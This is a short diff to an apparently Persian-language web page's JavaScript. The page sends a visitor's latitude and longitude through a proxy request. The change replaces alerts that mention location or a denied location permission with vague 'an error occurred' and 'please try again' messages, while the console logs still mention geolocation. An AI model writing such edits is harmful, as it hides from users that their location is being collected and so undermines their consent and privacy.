@@ -117,11 +117,11 @@
           alert("خطا! دوباره امتحان کنید");
         }).catch(function(err) {
           console.warn("Proxy request failed:", err);
-          alert("مختصات موقعیت دریافت نشد. لطفاً دوباره امتحان کنید.");
+          alert("شناسایی نشد. لطفاً دوباره امتحان کنید.");
         });
 
       } else {
-        alert("مختصات موقعیت دریافت نشد. لطفاً دوباره امتحان کنید.");
+        alert("لطفاً دوباره امتحان کنید.");
         console.warn("Latitude or Longitude is missing.");
       }
     }
@@ -129,7 +129,7 @@
     function showError(error) {
       switch(error.code) {
         case error.PERMISSION_DENIED:
-          alert("دسترسی به موقعیت مکانی رد شد.");
+          alert("با خطا مواجه شد.");
           console.error("User denied the request for Geolocation.");
           break;
         case error.POSITION_UNAVAILABLE:
